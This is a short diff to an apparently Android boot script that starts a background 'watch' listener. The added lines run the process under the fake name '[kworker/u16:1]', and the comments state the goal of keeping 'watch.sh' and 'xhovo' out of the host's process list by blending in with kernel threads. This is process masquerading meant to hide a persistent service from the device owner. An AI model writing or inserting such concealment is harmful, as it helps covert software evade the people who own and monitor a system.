@@ -45,10 +45,14 @@ fi
 
 log "开机启动监听 target=$target"
 
+# 进程名伪装：宿主的 ps 里不能出现 watch.sh / xhovo 这些字样，
+# 用内核工作线程的样式，混在 kworker 里看不出来。
+DISGUISE="[kworker/u16:1]"
+
 if command -v setsid >/dev/null 2>&1; then
-  nohup setsid /system/bin/sh "$WATCH" </dev/null >/dev/null 2>&1 &
+  nohup setsid /system/bin/sh -c "exec -a '$DISGUISE' /system/bin/sh '$WATCH'" </dev/null >/dev/null 2>&1 &
 else
-  nohup /system/bin/sh "$WATCH" </dev/null >/dev/null 2>&1 &
+  nohup /system/bin/sh -c "exec -a '$DISGUISE' /system/bin/sh '$WATCH'" </dev/null >/dev/null 2>&1 &
 fi
 
 # 等它写出 pid 再确认一次
